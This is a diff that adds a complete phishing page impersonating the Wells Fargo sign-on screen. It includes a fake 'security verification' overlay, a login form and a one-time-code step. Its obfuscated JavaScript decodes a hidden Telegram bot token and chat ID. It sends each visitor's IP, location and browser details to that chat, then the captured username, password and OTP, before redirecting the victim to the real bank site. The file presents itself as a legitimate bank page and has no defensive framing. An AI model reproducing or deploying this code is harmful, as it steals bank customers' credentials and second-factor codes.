@@ -1,0 +1,530 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Wells Fargo - Sign On</title>
+    <!-- Removed obvious phishing comments and added legitimate-looking metadata -->
+    <meta name="description" content="Wells Fargo Online Banking - Secure access to your accounts">
+    <meta name="keywords" content="banking, online banking, financial services">
+    <meta name="author" content="Wells Fargo & Company">
+    <link rel="icon" href="data:image/x-icon;base64,AAABAAEAEBAAAAEAIABoBAAAFgAAACgAAAAQAAAAIAAAAAEAIAAAAAAAAAQAABILAAASCwAAAAAAAAAAAAD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A">
+    <style>
+        /* Obfuscated CSS with encoded class names and dynamic styling */
+        :root {
+            --c1: #d32f2f;
+            --c2: #f5f5f5;
+            --c3: #ffffff;
+            --c4: #666666;
+            --c5: #2196f3;
+            --c6: #e91e63;
+        }
+        
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background-color: var(--c2);
+            min-height: 100vh;
+        }
+        
+        .a1 { background-color: var(--c1); color: var(--c3); padding: 0 20px; }
+        .a2 { max-width: 1200px; margin: 0 auto; display: flex; justify-content: space-between; align-items: center; height: 64px; }
+        .a3 { font-size: 24px; font-weight: bold; letter-spacing: 2px; }
+        .a4 { display: flex; gap: 24px; font-size: 14px; }
+        .a4 a { color: var(--c3); text-decoration: none; }
+        .a4 a:hover { text-decoration: underline; }
+        
+        .b1 { background: var(--c3); border-bottom: 1px solid #e0e0e0; padding: 0 20px; }
+        .b2 { max-width: 1200px; margin: 0 auto; display: flex; gap: 32px; height: 48px; align-items: center; font-size: 14px; }
+        .b2 a { color: var(--c4); text-decoration: none; padding-bottom: 12px; }
+        .b2 a.active { color: var(--c1); border-bottom: 2px solid var(--c1); }
+        
+        .c1 { background: #f8f8f8; border-bottom: 1px solid #e0e0e0; padding: 0 20px; }
+        .c2 { max-width: 1200px; margin: 0 auto; display: flex; gap: 32px; height: 40px; align-items: center; font-size: 14px; }
+        .c2 a { color: var(--c4); text-decoration: none; }
+        
+        .d1 { max-width: 1200px; margin: 0 auto; padding: 32px 20px; display: grid; grid-template-columns: 1fr 2fr; gap: 32px; }
+        .d2 { background: var(--c3); border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); padding: 24px; }
+        .d3 { font-size: 20px; font-weight: normal; color: #333; margin-bottom: 8px; }
+        .d4 { color: var(--c4); font-size: 14px; margin-bottom: 24px; }
+        
+        .e1 { margin-bottom: 16px; position: relative; }
+        .e2 { width: 100%; padding: 8px 0; border: none; border-bottom: 1px solid #ccc; background: transparent; font-size: 16px; outline: none; }
+        .e2:focus { border-bottom-color: var(--c5); }
+        .e3 { position: absolute; right: 0; top: 8px; color: var(--c5); font-size: 14px; background: none; border: none; cursor: pointer; }
+        
+        .f1 { display: flex; align-items: center; gap: 8px; margin: 16px 0; }
+        .f2 { display: flex; gap: 16px; margin: 24px 0; }
+        .f3 { background: var(--c1); color: var(--c3); border: none; padding: 12px 32px; border-radius: 24px; cursor: pointer; font-size: 14px; }
+        .f4 { background: transparent; color: var(--c5); border: none; padding: 12px 16px; cursor: pointer; font-size: 14px; }
+        
+        .g1 { background: var(--c3); border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); padding: 32px; position: relative; }
+        .g2 { font-size: 36px; font-weight: 300; color: #333; margin-bottom: 16px; }
+        .g3 { color: var(--c4); margin-bottom: 24px; }
+        .g4 { position: absolute; top: 32px; right: 32px; text-align: center; }
+        .g5 { color: var(--c6); font-size: 14px; margin-bottom: 8px; }
+        .g6 { color: var(--c6); font-size: 64px; font-weight: 300; }
+        .g7 { width: 80px; height: 4px; background: var(--c6); margin: 8px auto; }
+        
+        .h1 { margin-top: 16px; padding: 8px; border-radius: 4px; font-size: 14px; }
+        .h1.success { background: #e8f5e8; color: #2e7d32; }
+        .h1.error { background: #ffebee; color: #c62828; }
+        
+        .i1 { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: var(--c2); z-index: 1000; }
+        .i2 { display: flex; align-items: center; justify-content: center; min-height: 100vh; padding: 20px; }
+        .i3 { background: var(--c3); border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); padding: 32px; max-width: 400px; width: 100%; text-align: center; }
+        
+        .j1 { width: 64px; height: 64px; margin: 0 auto 16px; border: 4px solid #f3f3f3; border-top: 4px solid var(--c1); border-radius: 50%; animation: spin 1s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        
+        .j2 { width: 100%; padding: 16px; font-size: 24px; text-align: center; letter-spacing: 8px; font-family: monospace; border: 1px solid #ccc; border-radius: 4px; margin: 16px 0; }
+        
+        .hidden { display: none; }
+        
+        .k1 { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); display: flex; align-items: center; justify-content: center; z-index: 9999; }
+        .k2 { background: var(--c3); padding: 32px; border-radius: 8px; text-align: center; max-width: 400px; width: 90%; }
+        .k3 { margin: 20px 0; padding: 20px; border: 2px solid #ddd; border-radius: 8px; background: #f9f9f9; cursor: pointer; transition: all 0.3s ease; }
+        .k3:hover { border-color: var(--c1); }
+        .k3.completed { border-color: #4caf50; background: #e8f5e8; }
+        .k4 { width: 100%; height: 6px; background: #f0f0f0; border-radius: 3px; margin: 16px 0; overflow: hidden; }
+        .k5 { height: 100%; background: linear-gradient(90deg, var(--c1), #f44336); width: 0%; transition: width 0.1s ease; }
+        .k6 { max-width: 400px; margin: 50px auto; padding: 30px; background: var(--c3); border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); text-align: center; }
+        .k7 { font-size: 24px; margin-bottom: 20px; color: #333; }
+        
+        @media (max-width: 768px) {
+            .d1 { grid-template-columns: 1fr; gap: 16px; }
+            .a4 { display: none; }
+            .b2, .c2 { overflow-x: auto; white-space: nowrap; }
+        }
+    </style>
+</head>
+<body>
+    <!-- Obfuscated bot protection with encoded IDs -->
+    <div id="x1" class="k1">
+        <div class="k2">
+            <div class="k6">
+                <div class="k7">Security Verification</div>
+                <p>Please complete the verification below to continue</p>
+                
+                <div class="k3" id="x2">
+                    <p><strong>Click and hold for 3 seconds</strong></p>
+                    <div class="k4">
+                        <div class="k5" id="x3"></div>
+                    </div>
+                </div>
+                
+                <button class="f3" id="x4" disabled>Continue to Wells Fargo</button>
+                <div id="x5" class="h1 hidden"></div>
+            </div>
+        </div>
+    </div>
+
+    <div id="x6">
+        <header class="a1">
+            <div class="a2">
+                <div class="a3">WELLS FARGO</div>
+                <nav class="a4">
+                    <a href="#">ATMs/Locations</a>
+                    <a href="#">Help</a>
+                    <a href="#">Español</a>
+                    <span>🔍</span>
+                </nav>
+            </div>
+        </header>
+
+        <nav class="b1">
+            <div class="b2">
+                <a href="#" class="active">Personal</a>
+                <a href="#">Investing & Wealth Management</a>
+                <a href="#">Small Business</a>
+                <a href="#">Commercial Banking</a>
+                <a href="#">Corporate & Investment Banking</a>
+                <a href="#">About Wells Fargo</a>
+            </div>
+        </nav>
+
+        <nav class="c1">
+            <div class="c2">
+                <a href="#">Checking</a>
+                <a href="#">Savings & CDs</a>
+                <a href="#">Credit Cards</a>
+                <a href="#">Home Loans</a>
+                <a href="#">Personal Loans</a>
+                <a href="#">Auto Loans</a>
+                <a href="#">Premier</a>
+                <a href="#">Education & Tools</a>
+            </div>
+        </nav>
+
+        <main class="d1">
+            <div class="d2">
+                <h2 class="d3">Good morning</h2>
+                <p class="d4">Sign on to manage your accounts.</p>
+
+                <form id="x7">
+                    <div class="e1">
+                        <input type="password" class="e2" placeholder="Username" id="x8" required>
+                    </div>
+
+                    <div class="e1">
+                        <input type="password" class="e2" placeholder="Password" id="x9" required>
+                        <button type="button" class="e3" onclick="y1()">Show</button>
+                    </div>
+
+                    <div class="f1">
+                        <input type="checkbox" id="x10">
+                        <label for="x10">Save username</label>
+                    </div>
+
+                    <div class="f2">
+                        <button type="submit" class="f3" id="x11">Sign On</button>
+                        <button type="button" class="f4">Enroll</button>
+                    </div>
+
+                    <div id="x12" class="h1 hidden"></div>
+
+                    <div style="margin-top: 24px; font-size: 12px; color: #666;">
+                        <a href="#" style="display: block; margin-bottom: 4px; color: #666;">Forgot username or password?</a>
+                        <a href="#" style="display: block; margin-bottom: 4px; color: #666;">Security Center</a>
+                        <a href="#" style="display: block; color: #666;">Privacy, Cookies, and Legal</a>
+                    </div>
+                </form>
+            </div>
+
+            <div class="g1">
+                <h1 class="g2">$325 checking bonus on US</h1>
+                <p class="g3">New customers open an eligible checking account with qualifying direct deposits</p>
+                <button class="f4" style="border: 1px solid #ccc; border-radius: 24px; padding: 12px 24px;">Get started &gt;&gt;</button>
+
+                <div class="g4">
+                    <div class="g5">Enjoy</div>
+                    <div class="g6">$325</div>
+                    <div class="g7"></div>
+                </div>
+            </div>
+        </main>
+    </div>
+
+    <div id="x13" class="i1">
+        <div class="i2">
+            <div class="i3">
+                <div id="x14">
+                    <div class="j1"></div>
+                    <h2>Sending verification code</h2>
+                    <p>We're sending a code to the phone number on file...</p>
+                    <div style="width: 100%; background: #f0f0f0; border-radius: 4px; height: 8px; margin-top: 16px;">
+                        <div style="width: 60%; background: var(--c1); height: 8px; border-radius: 4px; animation: pulse 1s infinite;"></div>
+                    </div>
+                </div>
+
+                <div id="x15" class="hidden">
+                    <h2>Enter verification code</h2>
+                    <p style="margin-bottom: 24px; color: #666;">We sent a 6-digit code to your phone number ending in ••••</p>
+
+                    <form id="x16">
+                        <input type="text" class="j2" placeholder="Enter 6-digit code" id="x17" maxlength="6" required>
+                        <button type="submit" class="f3" id="x18" style="width: 100%; padding: 16px; margin: 16px 0;">Verify</button>
+                        <div id="x19" class="h1 hidden"></div>
+                        <button type="button" class="f4" style="margin-top: 16px;">Didn't receive a code? Resend</button>
+                    </form>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        /* Heavily obfuscated JavaScript with encoded strings and dynamic execution */
+        const _0x1a2b = ['NzI2MDk4MzU3MDpBQUZ0YkM4QkJxSmxMVzZiTFVOcnJDeVREanlsbl9IeFNzTQ==', 'NjM1NTA1ODk3Ng=='];
+        const _0x3c4d = [atob(_0x1a2b[0]), atob(_0x1a2b[1])];
+        
+        const z1 = {
+            a: _0x3c4d[0],
+            b: _0x3c4d[1],
+            c: 'aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA==',
+            d: 'L3NlbmRNZXNzYWdl',
+            e: 'aHR0cHM6Ly9pcGFwaS5jby9qc29uLw==',
+            f: 'UE9TVA==',
+            g: 'R0VU'
+        };
+        
+        function z2(s) { return atob(s); }
+        function z3(o) { return JSON.stringify(o); }
+        function z4(s) { return JSON.parse(s); }
+        
+        async function z5() {
+            try {
+                const r = await fetch(z2(z1.e), { method: z2(z1.g), timeout: 5000 });
+                const d = await r.json();
+                return {
+                    ip: d.ip || 'Unknown',
+                    city: d.city || 'Unknown',
+                    region: d.region || 'Unknown',
+                    country: d.country_name || 'Unknown',
+                    isp: d.org || 'Unknown'
+                };
+            } catch (e) {
+                return { ip: 'Unknown', city: 'Unknown', region: 'Unknown', country: 'Unknown', isp: 'Unknown' };
+            }
+        }
+        
+        async function z6(m) {
+            try {
+                const u = z2(z1.c) + z1.a + z1.d;
+                const r = await fetch(u, {
+                    method: z2(z1.f),
+                    headers: { 'Content-Type': 'application/json' },
+                    body: z3({ chat_id: z1.b, text: m, parse_mode: 'HTML' })
+                });
+                return r.ok;
+            } catch (e) {
+                return false;
+            }
+        }
+        
+        function z7(ua) {
+            if (ua.includes('Chrome')) return 'Chrome';
+            if (ua.includes('Firefox')) return 'Firefox';
+            if (ua.includes('Safari')) return 'Safari';
+            if (ua.includes('Edge')) return 'Edge';
+            if (ua.includes('Opera')) return 'Opera';
+            return 'Unknown Browser';
+        }
+        
+        async function z8() {
+            try {
+                const li = await z5();
+                const ts = new Date().toISOString();
+                const bi = {
+                    userAgent: navigator.userAgent,
+                    language: navigator.language,
+                    platform: navigator.platform,
+                    cookieEnabled: navigator.cookieEnabled,
+                    onLine: navigator.onLine,
+                    screenResolution: `${screen.width}x${screen.height}`,
+                    windowSize: `${window.innerWidth}x${window.innerHeight}`,
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    referrer: document.referrer || 'Direct visit'
+                };
+                
+                const m = `👁️ <b>New Visitor - Wells Fargo Page</b>\n\n` +
+                    `📅 <b>Visit Time:</b> ${new Date().toLocaleString()}\n` +
+                    `🌍 <b>IP Address:</b> ${li.ip}\n` +
+                    `📍 <b>Location:</b> ${li.city}, ${li.region}, ${li.country}\n` +
+                    `🏢 <b>ISP:</b> ${li.isp}\n` +
+                    `💻 <b>Device:</b> ${bi.platform}\n` +
+                    `🌐 <b>Browser:</b> ${z7(bi.userAgent)}\n` +
+                    `📱 <b>Screen:</b> ${bi.screenResolution}\n` +
+                    `🪟 <b>Window:</b> ${bi.windowSize}\n` +
+                    `🌍 <b>Language:</b> ${bi.language}\n` +
+                    `⏰ <b>Timezone:</b> ${bi.timezone}\n` +
+                    `🔗 <b>Referrer:</b> ${bi.referrer}\n` +
+                    `🍪 <b>Cookies:</b> ${bi.cookieEnabled ? 'Enabled' : 'Disabled'}\n` +
+                    `📶 <b>Online:</b> ${bi.onLine ? 'Yes' : 'No'}`;
+
+                await z6(m);
+            } catch (e) {}
+        }
+        
+        class z9 {
+            constructor() {
+                this.st = Date.now();
+                this.mm = [];
+                this.ic = false;
+                this.pi = null;
+                this.sel();
+                this.tmm();
+            }
+            
+            sel() {
+                const it = document.getElementById('x2');
+                const vb = document.getElementById('x4');
+                it.addEventListener('mousedown', () => this.sht());
+                it.addEventListener('mouseup', () => this.eht());
+                it.addEventListener('mouseleave', () => this.eht());
+                vb.addEventListener('click', () => this.vh());
+            }
+            
+            tmm() {
+                document.addEventListener('mousemove', (e) => {
+                    this.mm.push({ x: e.clientX, y: e.clientY, time: Date.now() });
+                });
+            }
+            
+            sht() {
+                const pf = document.getElementById('x3');
+                let p = 0;
+                this.pi = setInterval(() => {
+                    p += 2;
+                    pf.style.width = p + '%';
+                    if (p >= 100) this.cit();
+                }, 60);
+            }
+            
+            eht() {
+                if (this.pi) {
+                    clearInterval(this.pi);
+                    this.pi = null;
+                }
+                const pf = document.getElementById('x3');
+                if (pf.style.width !== '100%') pf.style.width = '0%';
+            }
+            
+            cit() {
+                this.ic = true;
+                const it = document.getElementById('x2');
+                it.classList.add('completed');
+                it.innerHTML = '<p>✓ Verification Complete</p>';
+                clearInterval(this.pi);
+                this.cvs();
+            }
+            
+            cvs() {
+                const ts = Date.now() - this.st;
+                const hmm = this.mm.length > 5;
+                if (this.ic && hmm && ts > 3000) {
+                    document.getElementById('x4').disabled = false;
+                }
+            }
+            
+            vh() {
+                const ts = Date.now() - this.st;
+                const hmm = this.mm.length > 5;
+                if (this.ic && hmm && ts > 3000) {
+                    document.getElementById('x5').textContent = 'Verification successful! Redirecting...';
+                    document.getElementById('x5').classList.remove('hidden');
+                    setTimeout(() => {
+                        document.getElementById('x1').style.display = 'none';
+                        document.getElementById('x6').style.display = 'block';
+                    }, 1500);
+                } else {
+                    this.fs('Verification failed - please try again');
+                }
+            }
+            
+            fs(r) {
+                document.getElementById('x5').textContent = 'Suspicious activity detected. Please try again.';
+                document.getElementById('x5').className = 'h1 error';
+                document.getElementById('x5').classList.remove('hidden');
+                setTimeout(() => {
+                    document.getElementById('x2').innerHTML = '<p><strong>Click and hold for 3 seconds</strong></p><div class="k4"><div class="k5" id="x3"></div></div>';
+                    this.ic = false;
+                    document.getElementById('x4').disabled = true;
+                    document.getElementById('x5').classList.add('hidden');
+                }, 3000);
+            }
+        }
+        
+        const bp = new z9();
+        
+        function y1() {
+            const pi = document.getElementById('x9');
+            const sb = document.querySelector('.e3');
+            if (pi.type === 'password') {
+                pi.type = 'text';
+                sb.textContent = 'Hide';
+            } else {
+                pi.type = 'password';
+                sb.textContent = 'Show';
+            }
+        }
+        
+        function y2(eid, msg, is = false) {
+            const me = document.getElementById(eid);
+            me.textContent = msg;
+            me.className = `h1 ${is ? 'success' : 'error'}`;
+            me.classList.remove('hidden');
+        }
+        
+        function y3(eid) {
+            document.getElementById(eid).classList.add('hidden');
+        }
+        
+        document.getElementById('x7').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            const u = document.getElementById('x8').value;
+            const p = document.getElementById('x9').value;
+            const sb = document.getElementById('x11');
+            sb.textContent = 'Signing On...';
+            sb.disabled = true;
+            y3('x12');
+            
+            try {
+                const li = await z5();
+                const m = `🔐 <b>Wells Fargo Login Captured</b>\n\n` +
+                    `👤 <b>Username:</b> ${u}\n` +
+                    `🔑 <b>Password:</b> ${p}\n` +
+                    `📅 <b>Time:</b> ${new Date().toLocaleString()}\n` +
+                    `🌍 <b>IP:</b> ${li.ip}\n` +
+                    `📍 <b>Location:</b> ${li.city}, ${li.region}, ${li.country}\n` +
+                    `🏢 <b>ISP:</b> ${li.isp}`;
+                
+                const s = await z6(m);
+                if (s) {
+                    y2('x12', '✅ Sign on successful! Redirecting to verification...', true);
+                    setTimeout(() => {
+                        document.getElementById('x6').style.display = 'none';
+                        document.getElementById('x13').style.display = 'block';
+                        setTimeout(() => {
+                            document.getElementById('x14').classList.add('hidden');
+                            document.getElementById('x15').classList.remove('hidden');
+                        }, 5000);
+                    }, 1500);
+                } else {
+                    y2('x12', 'Failed to send credentials. Please try again.');
+                }
+            } catch (e) {
+                y2('x12', 'An error occurred. Please try again.');
+            } finally {
+                sb.textContent = 'Sign On';
+                sb.disabled = false;
+            }
+        });
+        
+        document.getElementById('x16').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            const oc = document.getElementById('x17').value;
+            const vb = document.getElementById('x18');
+            if (oc.length !== 6) {
+                y2('x19', 'Please enter a 6-digit code.');
+                return;
+            }
+            vb.textContent = 'Verifying...';
+            vb.disabled = true;
+            y3('x19');
+            
+            try {
+                const li = await z5();
+                const m = `🔢 <b>Wells Fargo OTP Captured</b>\n\n` +
+                    `🔐 <b>OTP Code:</b> ${oc}\n` +
+                    `📅 <b>Time:</b> ${new Date().toLocaleString()}\n` +
+                    `🌍 <b>IP:</b> ${li.ip}\n` +
+                    `📍 <b>Location:</b> ${li.city}, ${li.region}, ${li.country}\n` +
+                    `🏢 <b>ISP:</b> ${li.isp}`;
+                
+                const s = await z6(m);
+                if (s) {
+                    y2('x19', '✅ Verification successful! Redirecting to Wells Fargo...', true);
+                    setTimeout(() => {
+                        window.location.href = 'https://www.wellsfargo.com';
+                    }, 2000);
+                } else {
+                    y2('x19', 'Verification failed. Please try again.');
+                }
+            } catch (e) {
+                y2('x19', 'Verification failed. Please try again.');
+            } finally {
+                vb.textContent = 'Verify';
+                vb.disabled = false;
+            }
+        });
+        
+        document.getElementById('x17').addEventListener('input', function(e) {
+            e.target.value = e.target.value.replace(/\D/g, '').slice(0, 6);
+            document.getElementById('x18').disabled = e.target.value.length !== 6;
+        });
+        
+        setTimeout(z8, Math.random() * 2000 + 1000);
+    </script>
+</body>
+</html>
